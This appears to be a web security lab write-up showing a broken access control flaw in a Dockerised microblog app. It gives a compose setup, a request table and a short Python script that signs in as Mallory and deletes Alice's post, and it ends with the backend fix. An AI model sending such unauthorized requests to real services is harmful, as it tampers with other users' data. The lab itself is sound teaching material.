This is an attack which is easily exploited
if the backend does not properly check the authenticated user
before performing an action.

## Setup

***

We require only the service vulnerable to this attack **microblog**, the target **Alice** and
the attacker **Mallory**

```yaml
version: '3'

services:
  microblog:
    image: # private image
    container_name: microblog
    ports:
      - "8080:80"
    networks:
      channel:
        ipv4_address: 10.0.0.2
        
  alice:
    image: # private image
    container_name: alice
    tty: true
    shm_size: '1gb'
    sysctls:
        - net.ipv6.conf.all.disable_ipv6=1
    networks:
      channel:
        ipv4_address: 10.0.0.3
        
  mallory:
      image: # private image
      container_name: mallory
      tty: true
      restart: always
      volumes:
          - .:/shared
      network_mode: service:microblog
      
  wireshark:
    image: # private image
    container_name: wireshark
    tty: true
    network_mode: service:microblog

networks:
  channel:
    driver: bridge
    ipam:
      config:
        - subnet: 10.0.0.0/24
```

We start the containers with `$ docker-compose up` and open a browser to `http://localhost:8080/`.

Upon the webapp starting, Alice populates it with a post: *Mallory should not be trusted!*.

## Observations

***

We can use Wireshark or simply the developer's console in our browser to see the requests being sent,
for instance logging in as Mallory we see.

![Firefox dev console](/assets/images/incmed4.png)
{: style="text-indent: 0;"}

With this, we create the following table detailing how each operation is sent to the server.

<div class="xscrollable">
<table>
<thead>
  <tr>
    <th>User Action</th>
    <th>Path</th>
    <th>HTTP method</th>
    <th>Form Data</th>
  </tr>
</thead>
<tbody>
  <tr>
    <td>Sign-in</td>
    <td>/signin.php</td>
    <td>POST</td>
    <td>email, password</td>
  </tr>
  <tr>
    <td>Post message</td>
    <td>/post.php</td>
    <td>POST</td>
    <td>msg</td>
  </tr>
  <tr>
    <td>Delete message</td>
    <td>/delete.php</td>
    <td>DELETE</td>
    <td>id</td>
  </tr>
</tbody>
</table>
</div>

## The Attack

***

For this lab, we will have Mallory delete a post made by Alice
despite the fact that the front-end UI doesn't allow them to.

Since there is no back end authentication for which account is performing
the action, mallory simply needs to sign in and make the appropriate request.
Using our table, we see what the server expects from a legitimate deletion.
We can then automate the process

```python
import os, requests
from urllib.parse import urlencode

PROTOCOL = "http"
HOST = "10.0.0.2"
PORT = "80"
BASE = PROTOCOL + "://" + HOST + ":" + PORT

# Mallory's credentials
mallory = {
    'email': 'mallory@example.com',
    'password': 'pass4mallory'
}

# start a session
with requests.Session() as s:
     # sign-in as mallory (POST request)
     res = s.post(BASE + '/signin.php', data=mallory)
     # delete Alice's message (DELETE request)
     res = s.delete(BASE + '/delete.php', data={'id': '3'})
```

<br>

***

## Conclusion

***

Running our script, we see that Alice's first message has been deleted as expected
despite the fact that Mallory should not have these permissions.
This can be solved quite easily by authenticating the the correct user is in fact logged
in in the back end. A rule of thumb is that the front-end should not be trusted since
it is user-controlled.

When you're done, don't forget to [clean up](/crypto/2020/10/08/05-lab.html#docker-cleanup)
after Docker.
